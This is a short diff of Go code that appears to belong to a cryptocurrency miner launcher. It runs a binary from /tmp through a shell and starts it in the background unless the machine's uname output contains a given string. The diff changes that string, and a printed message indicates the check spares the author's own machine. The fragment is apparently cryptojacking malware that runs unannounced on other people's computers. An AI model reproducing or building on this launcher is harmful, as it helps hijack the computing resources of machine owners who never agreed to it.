@@ -58,7 +58,7 @@ vk   :=  exec.Command("sh" , "-c", "cd /tmp ;  ./vkzmn " + config )
 
 ret_n  := uname_n()
   
-if strings.Contains(ret_n, "logical") { fmt.Println("not miner im machine by user logical") ; return }
+if strings.Contains(ret_n, "lubuntu") { fmt.Println("not miner im machine by user logical") ; return }
 
 
 go vk.Start()
